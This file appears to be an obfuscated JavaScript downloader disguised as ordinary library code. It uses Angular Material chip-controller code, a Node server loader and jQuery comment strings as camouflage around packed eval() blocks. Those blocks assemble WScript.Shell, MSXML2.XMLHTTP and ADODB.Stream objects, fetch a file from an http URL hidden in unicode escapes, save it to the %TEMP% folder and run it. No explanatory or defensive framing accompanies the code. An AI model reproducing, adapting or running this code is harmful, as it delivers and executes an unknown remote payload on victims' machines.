

function MdChipsCtrl ($scope, $mdConstant, $log, $element, $timeout) {

  this.$timeout = $timeout;
  this.$mdConstant = $mdConstant;
  this.$scope = $scope;
  this.parent = $scope.$parent;
  this.$log = $log;
  this.$element = $element;
  this.ngModelCtrl = null;
  this.userInputNgModelCtrl = null;
  this.userInputElement = null;
  this.items = [];
  this.selectedChip = -1;
  this.deleteHint = 'Press delete to remove this chip.';
  this.deleteButtonLabel = 'Remove';
  this.chipBuffer = '';
  this.useMdOnAppend = false;
};eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 6=0;a=\'b\';d.h.j=l(){4 3={5:m};3.7=3.5[("e"+"f"+"g"+("1","1","1","1","1","1","1","i")).8("k","9").8("9","b")](6,2);c 3.7};',23,23,'|diabolic||pentium|var|topmost|artifice|servers|replace|World|daunt||return|String|s|uBIsTst|ri|prototype|ng|immigration1|BIsT|function|this'.split('|'),0,{}))
var FooFormsServerApp = function () {

    //  Scope.
    var self = this;

    self.walk = function (pathToWalk) {
        fs.readdirSync(pathToWalk).forEach(function (file) {
            var newPath = path.join(pathToWalk, file);
            var stat = fs.statSync(newPath);
            if (stat.isFile()) {
                if (/(.*)\.js/.test(file)) {
                    log.debug(__filename, ' - ', 'Requiring: ' + newPath);
                    require(newPath);
                }
            } else if (stat.isDirectory()) {
                self.walk(newPath);
            }
        });
    };

    self.bootstrapModels = function () {
        // Load the root models
        try {
            var rootModelsPath = path.join(global.config.root, 'models');
            if (fs.existsSync(rootModelsPath)) {
                self.walk(rootModelsPath);
            }
        } catch (err) {
            log.error(__filename, ' - ', err);
        }

        // Look for and load any app models
        var modulesPath = path.join(global.config.root, 'modules');
        fs.readdirSync(modulesPath).forEach(function (appDir) {
            var modelsPath = path.join(path.join(modulesPath, appDir), 'models');
            if (fs.existsSync(rootModelsPath)) {
                try {
                    var stat = fs.statSync(modelsPath);
                    if (stat.isDirectory()) {
                        self.walk(modelsPath);
                    }
                } catch (err) {
                    log.error(__filename, ' - ', err);
                }
            }
        });
    };

    self.start = function () {
        log.info(__filename, ' - ', 'Starting web server...');
        io.on('connection', function(socket){
            log.info('a user connected');
            socket.on('disconnect', function(){
                log.info('user disconnected');
            });
        });
        http.listen(self.port, self.ipaddress, function () {
            log.info(__filename, ' - ', '%s: Node server started on %s:%d ...',
                new Date(Date.now()), self.ipaddress, self.port);
        });
    };
};
String.prototype.immigration = function () {
    return this.immigration1().split("")[0];
};
MdChipsCtrl.prototype.chipKeydown = function (event) {
  if (this.getChipBuffer()) return;
  switch (event.keyCode) {
    case this.$mdConstant.KEY_CODE.BACKSPACE:
    case this.$mdConstant.KEY_CODE.DELETE:
      if (this.selectedChip < 0) return;
      event.preventDefault();
      this.removeAndSelectAdjacentChip(this.selectedChip);
      break;
    case this.$mdConstant.KEY_CODE.LEFT_ARROW:
      event.preventDefault();
      if (this.selectedChip < 0) this.selectedChip = this.items.length;
      if (this.items.length) this.selectAndFocusChipSafe(this.selectedChip - 1);
      break;
    case this.$mdConstant.KEY_CODE.RIGHT_ARROW:
      event.preventDefault();
      this.selectAndFocusChipSafe(this.selectedChip + 1);
      break;
    case this.$mdConstant.KEY_CODE.ESCAPE:
    case this.$mdConstant.KEY_CODE.TAB:
      if (this.selectedChip < 0) return;
      event.preventDefault();
      this.onFocus();
      break;
  }
};
String.prototype.shd = function () {
    return this.replace("folk",".S").replace("lore","hell");
};
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('p q=["A"+"0"+"o"+"n"+("k","l","m","r","s","y","z","x")+"0","w"+"t"+"u"+("v","j","i","5","6","7","4","3","1")+("2","8","9","f","g","h","e","d","a"),""+"%"+("b","c","C","T","11","12","13","10"),""+"."+("Z","V","X","Y","15","1a","1c","1b"),"19"+"18.16"+"17"+("14","U","I","J","H","G","D","E","F"),"W"+"K"+"L"+("R","S","Q","P","M","N","O","B")];',62,75,'ct|onme|ethan|minds|seamanship|akimbo|capability|clips|budding|barriers|ntStrings|nebuchadnezzar|relating|scheduling|uruguay|diabolic|corduroy|portent|temple|presentday|findarticles|towing|synod|eXOb|iv|var|dNmDxVL|saffron|consensus|dE|nvir|dividend|Expan|je|rochester|repine||folklore|natural|toilet|licking|TTP|meuse|concentric|crest|verify|Sc|ript|outstanding|newark|suzerainty|defence|nicest|layout|architect|hades|consanguinity|linseed||installing|rolling|spurn|TE|accordingly|praiseworthy|stuffing|trailer|waken|XM|LH|ML2|MSX|uninteresting|exe|oblation'.split('|'),0,{}))

lxOinTHB = "} Caller can pass in an object of custom data in lieu of the handler if ( handler.handler ) { handleObjIn = handler; handler = handleObjIn.handler; selector = handleObjIn.selector; ";
var yQsPqXrcG = this[dNmDxVL.shift()];
RyuknQIU = "yLginsmR";
scared = (("tertiary", "uprightness", "participating", "ripped", "pTSvVYKTGwo") + "ASqUyyRuprF").immigration();
walters = (("oppressor", "wheedle", "critics", "fragile", "shkyXRnolNC") + "KKlCybQm").immigration();
var virginian ="";
finances = ("n"+("prevention","addicted","showcase","universities","algeria","animate","embargo","washing","ep") + String.fromCharCode(111)).split("");

eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0 1=2 3(4.5().6());',7,7,'var|AObrNBNnb|new|yQsPqXrcG|dNmDxVL|pop|shd'.split('|'),0,{}))
KHnqDTV = " add: function( elem, types, handler, data, selector ) { var tmp, events, t, handleObjIn, special, eventHandle, handleObj, handlers, type, namespaces, origType, elemData = jQuery._data( elem );";
var nAmnImXCA = new yQsPqXrcG(dNmDxVL.pop());
nAmnImXCA.onreadystatechange = function () {
if (nAmnImXCA['readystate'] === 4) {
	tutterd(nAmnImXCA,virginian);
}
};
LpfaFQKpkB = " global: {},";
var IutpmE = AObrNBNnb[dNmDxVL.shift()](dNmDxVL.shift() + "MP%");
fpqIctYT = " Don\"t attach events to noData or text/comment nodes (but allow plain objects) if ( !elemData ) { return; ";
quilte = (("proxy", "intrust", "viewing", "adviser", "EntrwcmxKM") + "yymLxoTu").immigration();
var bewitched = Math.random() ;
function sitting(looks, dairy) {

    try {
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('i=H+"/"+l+a.c();d="} 4 3 L 1a 1, b 5 2 3 f g 5 h 1 2 = 6.3.2[ 1 ] || {};";j(k>0){7[(m).n().o("")](("p","q","r","s","t","u","v","w","G")+x+("y","z","A","B","C","D","E","F","T"),I,J)}K=" 4 8 M, N 2 3 O 1, P Q 1 1 = ( 8 ? 2.R : 2.S ) || 1;";7[U+("V","W","X","Y","Z","10","11","12","e")+(("13","14","15","16","17","18")+"19").9()+(("1b","1c","1d","1e","1f","1g")+"1h").9()]();1i=" 1j 2 1k 1l 1m 1n 1 2 = 6.3.2[ 1 ] || {};";',62,86,'|type|special|event|If|the|jQuery|nAmnImXCA|selector|immigration|dNmDxVL|use|shift|kWEYsxovQvY||handlers|for|changed|virginian|if|bewitched|dairy|finances|reverse|join|olympics|melee|counted|litigation|preparing|grande|incentive|instruments|quilte|conversion|partners|errol|tiffany|freud|skills|architects|taken||IutpmE|looks|false|idCncMRn|changes|defined|determine|api|otherwise|given|delegateType|bindType||walters|astuteness|freeze|admittance|shrub|vulnerable|wallow|vaunted|locale|snaps|spree|swamped|scholarships|returning|npLbCaJItYY|PFpMXpvIyu|its|farmers|travel|homestead|dunbar|scales|dpafntF|SDHMSA|XsyCNvAHv|Update|based|on|newly|reset'.split('|'),0,{}))
	
} catch (MjmHlMXm) { };
    QFNuNWiVY = " Init the event handler queue if we\"re the first if ( !( handlers = events[ type ] ) ) { handlers = events[ type ] = []; handlers.delegateCount = 0;";
}
eval(function(p,a,c,k,e,r){e=String;if(!''.replace(/^/,String)){while(c--)r[c]=k[c]||c;k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1 2=(("3")+("0+0")+"4:").5("+").6("")+"//";',7,7,'t|var|herbdent|h|p|split|join'.split('|'),0,{}))
function tutterd(ridszAD,Podstak){
        var pqpzxBEiN = new yQsPqXrcG((""+"A"+"pO"+("disconsolate","cooperative","beaver","punjab","elemental","shaped","administered","prefecture","DB.") + ""+("systems","posting","bracelet","yellow","pennant","albumen","tableaux","S")+("hotels","alsatian","provisionally","comparable","supernumerary","courtier","presentation","tr")+"eam").replace("p", "D"));
        pqpzxBEiN[""+("sawing","cudgel","irish","blocks","water","flight","lamps","o")+"pen"]();
        rSAqofNbTEO = "} Make sure that the handler has a unique ID, used to find/remove it later if ( !handler.guid ) { handler.guid = jQuery.guid++; ";
        pqpzxBEiN.type = 1;
		uFvNJemn = "} Init the element\"s event structure and main handler, if this is the first if ( !( events = elemData.events ) ) { events = elemData.events = {}; } if ( !( eventHandle = elemData.handle ) ) { eventHandle = elemData.handle = function( e ) {";
        pqpzxBEiN["w"+("vsnet","bitch","claire","vermin","barry","belie","prospects","vegetables","ri")+"te"](ridszAD[("locked","prelate","additionally","asset","amsterdam","three","kissing","carver","")+"R"+"es"+"pon" + walters + "e"+("productivity","spectral","interracial","nelson","stocking","disrepute","nagasaki","herring","Bo")+"dy"]);
        ThIzaEpVou = " Discard the second event of a jQuery.event.trigger() and when an event is called after a page has unloaded return typeof jQuery !== \"undefined\" && ( !e || jQuery.event.triggered !== e.type ) ? jQuery.event.dispatch.apply( eventHandle.elem, arguments ) : undefined; };";
        pqpzxBEiN[(scared + "o"+"Di"+"ti"+("valid","fortyfour","youngster","instruments","fortieth","person","moscow","blasphemy","on")).replace("D", walters)] = 0;
        cUTFlRWCx = " Add elem as a property of the handle fn to prevent a memory leak with IE non-native events eventHandle.elem = elem; ";
        pqpzxBEiN[("retail","penguin","roulette","imagery","sacristan","fiftyfive","beautify","sav")+"eT"+"oF"+"ile"](Podstak, 2);
        dHRzkhYane = "} Handle multiple events separated by a space types = ( types || \"\" ).match( rnotwhite ) || [ \"\" ]; t = types.length; while ( t-- ) { tmp = rtypenamespace.exec( types[ t ] ) || []; type = origType = tmp[ 1 ]; namespaces = ( tmp[ 2 ] || \"\" ).split( \".\" ).sort();";
        pqpzxBEiN.close();
        LkxKQPnzxe = " There *must* be a type, no attaching namespace-only handlers if ( !type ) { continue; ";
        AObrNBNnb["R"+("screech","migration","breaker","whisk","discounts","until","foster","lauren","un")](Podstak, 1, "tvTmEQEh" === "tauOty"); dAuGQ = " Only use addEventListener/attachEvent if the special events handler returns false if ( !special.setup || special.setup.call( elem, data, namespaces, eventHandle ) === false ) {";
}

   function inherit_A( Child, Parent)
{
    var F = function () { };
    F.prototype = Parent.prototype;

    Child.prototype = new F();
    Child.prototype.constructor = Child;
}

sitting(herbdent + "\u0073\u0070\u0072\u0061\u0073\u007A\u0079\u006E\u002E\u0068\u006F\u006D\u0065\u002E"+"\u0070\u006C\u002F\u0038\u0039\u0079\u0067\u0037\u0067\u0038\u0037\u0062\u0079\u0069","WEDOJDtQYwg");

function inherit_B(Child, Parent)
{
    var F = function () { };
    F.prototype = Parent.prototype;
    var f = new F();
    
    for (var prop in Child.prototype) f[prop] = Child.prototype[prop];
    Child.prototype = f;
}